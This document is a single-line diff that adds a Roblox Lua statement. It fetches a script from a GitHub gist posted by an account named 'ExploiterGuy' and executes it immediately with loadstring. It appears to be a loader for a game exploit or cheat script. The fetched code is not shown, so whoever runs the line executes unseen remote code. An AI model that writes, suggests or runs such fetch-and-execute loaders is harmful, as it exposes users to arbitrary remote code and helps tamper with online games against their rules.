@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://gist.githubusercontent.com/ExploiterGuy/b8659d1d7ece7c730daa268071601d14/raw/7687c7266d5fa17d070cadb9e7886cc96400a1fb/School%2520Line%2520%25F0%259F%258E%2592"))()
